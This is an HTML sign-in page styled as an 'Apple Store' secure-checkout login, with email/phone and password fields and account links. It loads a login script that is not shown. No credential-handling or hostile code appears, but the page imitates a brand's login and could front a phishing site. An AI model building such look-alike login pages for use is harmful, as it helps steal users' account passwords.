<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Sign In - Secure Checkout</title>
    <link rel="stylesheet" href="/css/login.css" />
  </head>
  <body>
    <div class="container">
      <h1>Sign in for faster checkout</h1>
      <h2>Sign in to Apple Store</h2>
      <form>
        <input
          type="text"
          id="username"
          name="username"
          required
          placeholder="Email or Phone Number"
        />
        <input
          type="password"
          id="password"
          name="password"
          required
          placeholder="Password"
        />
        <input type="submit" id="submit" value="Sign In" />
      </form>
      <div class="extra">
        <input type="checkbox" name="" id="" />Remember me
        <br />
        <a href="/routes/login.html">Forgot your password? ↗</a>
        <p>
          Don't have an Apple Account?<a href="/routes/login.html">
            Create yours now. ↗</a
          >
        </p>
      </div>
    </div>
  </body>
</html>
<script type="module" src="/script/login.js"></script>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
